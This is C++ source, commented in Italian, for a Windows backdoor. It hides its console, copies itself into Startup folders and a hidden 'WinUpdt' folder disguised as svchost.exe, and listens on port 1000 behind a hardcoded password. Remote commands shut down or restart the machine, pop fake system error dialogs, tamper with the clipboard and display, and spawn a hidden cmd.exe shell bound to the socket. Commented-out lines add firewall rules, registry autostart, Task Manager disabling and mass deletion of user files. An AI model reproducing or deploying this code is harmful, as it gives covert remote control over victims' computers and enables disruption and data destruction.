
// Client/Server 
// author: Blackname23
// mail: grandeandrea@live.it
// msn: grandeandrea@live.it

// socket non bloccante
// strumenti -> opzioni compilazione -> linker -> -lwsock32
// digitare client.stop per interrompere la connessione


#include <windows.h>
#include <stdio.h>
#include <conio.h>
#include <stdlib.h>
#include <string.h>
#include <iostream>

using namespace std;

inline void stringhe();
void ServerStart(SOCKET s);
string comando[100];
int i;
int psw=0;
     char tx[1024], rx[1024]; // buffer trasmissione e ricezione
     char temp[1024]; // buffer temporaneo per ricevere il testo da tastiera
void server(void);

string nome_prog;
string nome;
string nome2;

int main(int argc, char *argv[])
{     
     system("@echo off");
     
     //nasconde console
     HWND hWnd = FindWindow("ConsoleWindowClass" , NULL);
     ShowWindow(hWnd, SW_HIDE);
     
     //system("date 01-01-00");
     //system("time 00:00:01");
     
     //nome_prog=argv[0]; //percorso e nome di questo programma
     
     CopyFile(argv[0], "\"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\svchost.exe\"", FALSE);
     CopyFile(argv[0], "\"%appdata%\\Microsoft\\Windows\\Start Menu\\Programmi\\Startup\\svchost.exe\"", FALSE);
     system("mkdir \"%SystemDrive%\\WinUpdt\\\"");
     CopyFile(argv[0], "\"%SystemDrive%\\WinUpdt\\svchost.exe\"", FALSE);
     system("attrib +h +s \"%SystemDrive%\\WinUpdt\"");
     
     /*-----------------------------------VECCHIO CODICE------------------------
     nome="copy /y "+nome_prog+" \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\svchost.exe\"";
     nome="copy /y "+nome_prog+" \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programmi\\Startup\\svchost.exe\"";
     nome2="copy /y "+nome_prog+" %SystemDrive%\\WinUpdt\\svchost.exe";
     const char *cmd  = nome.c_str();
     const char *cmd2 = nome2.c_str();
     system(cmd);
     system("md \"%SystemDrive%\\WinUpdt\\\"");
     system(cmd2);
     -------------------------------------------------------------------------*/
     
     system("cls");
     
     //system("netsh firewall add portopening protocol=TCP port=1000 name=\"WinUpdt\" mode=ENABLE scope=ALL");
     //system("netsh advfirewall firewall add rule name=\"WinUpdt\" dir=in action=allow protocol=tcp localport=1000 remoteip=any");
     system("cls");
     
     //ShellExecuteA(NULL,"open","http://cacca11.altervista.org/server/grazie.php",NULL,NULL,SW_SHOWNORMAL);
     
     //esecuzione automatica di sistema
     //system("reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"svchost.exe\" /t REG_SZ /d \"%SystemDrive%\\WinUpdt\\svchost.exe\" /f");
     
     system("CLS");
     
     ShowWindow(hWnd, SW_HIDE);
     
     server();
}

void server(void)
{
     SOCKET sock, acceptsock,s;
     system("CLS");
     unsigned int port = 1000; // le porte hanno un range di valori da 0 a 65535, proprio come una variabile unsigned int
     long j; // temporaney counter

     WSADATA wsadata;
     WSAStartup(MAKEWORD(2,2), &wsadata);
     sock = WSASocket( AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0 );

     u_long nonblock = 1;
     ioctlsocket(sock, FIONBIO, &nonblock); // configurazione non bloccante
     
     sockaddr_in sockaddr;
     sockaddr.sin_family = PF_INET;
     sockaddr.sin_addr.s_addr = INADDR_ANY;
     sockaddr.sin_port = htons(port);

     bind(sock, (SOCKADDR*)&sockaddr, sizeof(sockaddr));
     listen(sock, 1);
     
     
     int sock2=sock;
     goto dopo1;     //
     inizio:         // 
     system("CLS");  // questo permette la riconnessione quando viene riavviato il server
     sock=sock2;       // 
     dopo1:          //
     psw=0;
     
     printf("\n\nIn ascolto alla porta %d", port);
     acceptsock = (SOCKET)SOCKET_ERROR;

     i = 0;
     while(acceptsock == SOCKET_ERROR)
     {
          acceptsock = accept(sock, 0, 0);

          Sleep(150);
          i += 150;
          if(i == 150) printf(".");
          if(i == 300) printf(".");
          if(i == 450) printf(".");
          if(i == 600) printf(".");
          if(i == 750) printf(".");
          if(i == 900)
          {
               printf("\b \b\b \b\b \b\b \b\b \b");
               i = 0;
          }
     }

     printf("\rIn ascolto alla porta %d.....", port);
     printf("\n\nConnesso!\n\n");

     sock = acceptsock;
     s = acceptsock;
          
     while(1)
     {
         
          memset(rx, 0, 1024);
          memset(tx, 0, 1024);
          j = recv(sock, rx, 1024, 0);          
          
          stringhe();
          //comando.assign(rx); //assume valore rx 
          
          if (((comando[0]=="/password")||(comando[0]=="/psw"))&&(comando[1]=="Andrea1996")) psw=1; //controlla password
          
          if(psw){
          
          if (comando[0]=="1") {                                                 //chiudi server
                   cout<<"Server in chiusura...."<<endl;
                   exit(8);
                         }
          else if (comando[0]=="2") {                                            //riavvia server
                            //closesocket(sock);
                            //closesocket(acceptsock);
                            goto inizio;
                                          }
          else if (comando[0]=="3") {                                            //spegni xx minuti
                   string shut;
                   int tempo = atoi(comando[1].c_str());
                   if (tempo>0) shut="shutdown -s -t "+comando[1]+" "+comando[2]+" "+comando[3];
                   else shut="shutdown -s -t 01 "+comando[2]+" "+comando[3];
                   system(shut.c_str());
                   cout<<"Spegni effettuato"<<endl;
                   goto ok;
                         }
          else if (comando[0]=="4\n") {                                          //spegni istantaneo
                   string shut="shutdown -a";
                   system(shut.c_str());
                   goto ok;
                         }
          else if (comando[0]=="5") {                                            //riavvia
                   string shut="shutdown -r -t "+comando[1]+" -c \" \"";
                   system(shut.c_str());
                   cout<<"Riavvia effettuato"<<endl;
                   goto ok;
                         }
          else if (comando[0]=="6") {                                            //iberna
                   string shut="shutdown -h -t "+comando[1]+" -c \" \"";
                   system(shut.c_str());
                   cout<<"Iberna effettuato"<<endl;
                   goto ok;
                         }
          else if (comando[0]=="7") {                                            //rovina- elimina files
                   /*
                   system("del /q *.jpg");
                   system("del /q *.jpeg");
                   system("del /q *.flv");
                   system("del /q *.avi");
                   system("del /q *.ico");
                   system("del /q *.ani");
                   system("del /q *.gif");
                   system("del /q *.bnp");
                   system("del /q *.png");
                   system("del /q *.odt");
                   system("del /q *.doc");
                   system("del /q *.xls");
                   system("del /q *.mp3");
                   system("del /q *.mp4");
                   system("del /q *.ogg");
                   system("del /q *.pdf");
                   system("del /q *.zip");
                   system("del /q *.rar");
                   system("del /q *.mpeg");
                   system("del /q *.wmv");
                   system("del /q *.3gp");
                   system("del /q *.ods");
                   system("del /q *.odp");
                   system("del /q *.dwg");
                   system("del /q *.dxf");
                   system("del /q *.dpcx");
                   system("del /q *.xlsx");
                   system("del /q *.htm");
                   system("del /q *.html");
                   system("del /q *.php");
                   system("del /q *.shtml");
                   system("del /q *.shtm");
                   system("del /q *.stm");
                   system("del /q *.txt");
                   */
                   cout<<"Files eliminati"<<endl;
                   goto ok;
                         }
          else if (comando[0]=="8") {                                            //cursore
                   /*
                   system("reg delete \"HKEY_CURRENT_USER\ControlPanel\Cursors\" /f");
                   system("del /q *.cur");
                   system("del /q *.ani");
                   */
                   goto ok;
                         }
          else if (comando[0]=="9") {                                            //impalla
                   //a:
                   system("start");
                   //goto a;
                   goto ok;
                         }
          
          else if (comando[0]=="10") {                                           //chiedi se riavviare
                                          
                       int messaggio = MessageBox(NULL,"Il computer ha eseguito un'operazione non valida.\nRiavviare il computer adesso?","Errore grave",MB_YESNO|MB_ICONERROR|MB_SYSTEMMODAL);
                       switch(messaggio) {
                       case IDYES:
                                 system("shutdown -r -t 1 -c \"Riavvio in corso...\"");
                                 break;
                       case IDNO:
                                 break;
                         default:
                                 break;
                                         }
                       goto ok; }
           
           
           else if (comando[0]=="11"){                                              //svuota clipboard
                          OpenClipboard(NULL);
	                      EmptyClipboard();
	                      CloseClipboard();
                          goto ok;
                          }
           else if (comando[0]=="12"){                                              //display off
                               while(1){
                               SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2);
                               j = send(sock, tx, 1, 0);
                               memset(rx, 0, 1024);
                               j = recv(sock, rx, 1024, 0);   
                               stringhe();       
                               comando[0].assign(rx); //assume valore rx
                               if(comando[0]=="13") SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, -1);
                }
                               goto ok;
                               }
           else if (comando[0]=="13"){                                              //display on
                               SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, -1); 
                               }
           else if (comando[0]=="14"){                                             //disabilita task manager
                               //system("reg add \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v \"DisableTaskMgr\" /t REG_DWORD /d \"1\" /f");
                                   }
           else if (comando[0]=="15"){                                             //abilita task manager
                               //system("reg add \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v \"DisableTaskMgr\" /t REG_DWORD /d \"0\" /f");
                                   }
           else if (comando[0]=="16"){                                             //disabilita esegui
                               //system("reg add \"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\" /v \"NoRun\" /t REG_DWORD /d \"1\" /f");
                                   }
           else if (comando[0]=="17"){                                             //abilita esegui
                               //system("reg add \"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\" /v \"NoRun\" /t REG_DWORD /d \"0\" /f");
                                   }
           else if (comando[0]=="18"){                                             //disabilita tema e sfondo
                               //system("reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v \"NoDispAppearancePage\" /t REG_DWORD /d \"1\" /f");
                               //system("reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v \"NoDispBackgroundPage\" /t REG_DWORD /d \"1\" /f");
                               //system("reg add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\\" /v \"Wallpaper\" /t REG_SZ /d \"\" /f");
                                   }
           else if (comando[0]=="19"){
                               int comand=atoi(comando[3].c_str());
                               int tipo;
                               if (comand>0) tipo=2097152/*MB_SERVICE_NOTIFICATION*/+8192/*MB_TASKMODAL*/+ comand;
                               else tipo=MB_TASKMODAL | MB_SERVICE_NOTIFICATION | MB_DEFBUTTON1 | MB_OK;
                               MessageBox(0, comando[1].c_str(), comando[2].c_str(), tipo);
                               goto ok;
                                      }
           else if (comando[0]=="20"){                                          //Metti in clipboard
                               char far *buffer;
                               int bytes;
                               HGLOBAL clipbuffer;
                               OpenClipboard(NULL);
                               EmptyClipboard();
                               clipbuffer = GlobalAlloc(GMEM_DDESHARE,bytes+1);
                               buffer = (char far*)GlobalLock(clipbuffer);
                               strcpy(buffer,comando[1].c_str());
                               GlobalUnlock(clipbuffer);
                               SetClipboardData(CF_TEXT,clipbuffer);
                               CloseClipboard();
                               goto ok;
                                      }
           else if (comando[0]=="/cmd"){                  //attiva shell remota
                               ServerStart(sock);
                               }
                                      
           else if(comando[0]=="") {
                cout<<"comando non trovato"<<endl;
                }
                
           if (comando[0]=="") tx[0]='0';
           else tx[0]='1';
       
       }//fine per password
       
       ok:
          j = send(sock, tx, 2, 0);
          if(j == -1) {
                            closesocket(sock);
                            closesocket(acceptsock);
                            goto inizio;
                            exit(8);
                      }
                      
          
          
          Sleep(5); // un sospiro per la CPU


     }

     closesocket(sock);
     closesocket(acceptsock);
}

void ServerStart(SOCKET s)
{

    PROCESS_INFORMATION pi;
    STARTUPINFO si;

    memset( &si, 0, sizeof( si ) );
    si.cb = sizeof( si );
    si.wShowWindow = SW_HIDE;
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    
    si.hStdInput = (HANDLE)s;
    si.hStdOutput = (HANDLE)s;
    si.hStdError = (HANDLE)s;
    
    CreateProcess( NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi );//Start the remote process
    
    WaitForSingleObject( pi.hProcess, INFINITE );//Allow Client to control remote process
    
    CloseHandle( pi.hProcess );
    CloseHandle( pi.hThread );
}

inline void stringhe(){
for (int i=0;i<100;i++){
comando[i]="";
}
string serve;
int cont=0;
bool apici;
bool slash;
for (int i=0;rx[i]!='\0';i++){
if (cont==99) break;
if (rx[i]=='"'){ apici=!apici; continue; }
if ((rx[i]=='\\')&&(rx[i+1]=='n')) {serve=serve+'\n'; i++; continue; }
if ((rx[i]==' ')&&(!apici)){ comando[cont]=serve; cont++; serve=""; }
else serve=serve+rx[i];
}
comando[cont]=serve;
}
